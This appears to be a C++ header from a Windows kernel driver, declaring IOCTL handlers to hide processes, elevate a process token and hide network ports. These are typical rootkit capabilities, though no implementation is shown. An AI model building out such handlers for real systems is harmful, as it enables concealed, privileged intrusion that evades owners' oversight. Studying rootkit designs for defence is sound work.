#pragma once
#include <ntifs.h>

namespace IoctlHandlers {

	NTSTATUS HideProcess(PIRP Irp);

	NTSTATUS ElevateToken(PIRP Irp);

	NTSTATUS HidePort(PIRP Irp);
}